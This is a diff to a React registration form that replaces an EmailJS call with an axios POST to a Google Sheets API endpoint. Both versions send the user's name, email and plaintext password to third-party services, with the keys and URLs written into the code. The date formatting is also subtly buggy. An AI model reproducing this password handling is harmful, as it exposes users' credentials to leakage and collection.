@@ -1,5 +1,5 @@
 import React, { useState } from "react";
-import emailjs from '@emailjs/browser';
+import axios from "axios";
 
 const Register = ({formState, setFormState}) => {
     const [name, setName] = useState('')
@@ -11,24 +11,24 @@ const Register = ({formState, setFormState}) => {
 
     const __sendEmail = (e) => {
         e.preventDefault();
-        
         if (password === rPassword && password.length > 7) {
             setButtonVal('Please Wait...')
-            emailjs.send('gmail-react', 'template_fzfd6jd', 
-            {
-                _engine: name,
-                _email: email,
-                _password: password,
-            }, '-ULgQTRPj8f-lNNg0')
-                .then(function() {
-                    setButtonVal('Registered!')
-                    
-                }, function(error) {
-                    console.log('FAILED...', error);
-                    alert('Authentication Failed... Please try again', error)
-                    setButtonVal('Register')
-                }
-            );
+            let d = new Date()
+            let date = `${d.getDay()}/${d.getMonth()}/${d.getFullYear()}`
+            let id = Date.now() * Math.random()
+            axios ({
+                method: 'post',
+                url: 'https://v1.nocodeapi.com/tuxa/google_sheets/xQtvMBfFFgfpISRL?tabId=Sheet1', 
+                params: {},
+                data: [[id, name, email, password, date]]
+            }).then(function (response) {
+                setButtonVal('Registered!')
+                console.log(response.data);
+            }).catch(function (error) {
+                alert('Authentication Failed... Please try again', error)
+                setButtonVal('Register')
+                console.log(error); 
+        })
         } else {
             alert('Registration failed.. please try again.')
             setButtonVal('Register')
